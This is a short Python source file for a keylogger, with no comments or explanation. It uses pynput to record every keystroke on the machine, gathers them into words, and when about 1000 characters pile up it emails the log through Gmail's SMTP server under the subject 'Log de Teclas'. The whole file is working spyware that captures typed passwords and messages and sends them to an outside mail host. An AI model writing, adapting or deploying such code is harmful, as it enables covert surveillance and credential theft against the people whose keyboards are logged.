#KL

import smtplib
import subprocess
import threading
from pynput.keyboard import Key, Listener
from pynput import keyboard
from email.mime.text import MIMEText

fullog = ''
words = ''
email_char_limit = 1000

email = ""
password = ""

server = smtplib.SMTP_SSL("smtp.gmail.com", 465)
server.login(email, password)

def on_press(key):
    global words
    global fullog
    global email
    global email_char_limit

    if key == Key.space or key == Key.enter:
        words += ' '
        fullog += words
        words = ''

        if len(fullog) >= email_char_limit:
            send_log()
            fullog = ''

    elif key == Key.shift_l or key == Key.shift_r:
        return

    elif key == Key.backspace:
        words = words[:-1]

    elif key == Key.esc:
        return False

    elif hasattr(key, 'char') and key.char is not None:
        words += key.char

    else:
        words += f"<{key.name}>"
    
    
def send_log():
    msg = MIMEText(fullog, _charset="utf-8")
    msg["Subject"] = "Log de Teclas"
    msg["From"] = email
    msg["To"] = email
    server.send_message(msg)

with Listener(on_press = on_press) as listener:
    listener.join()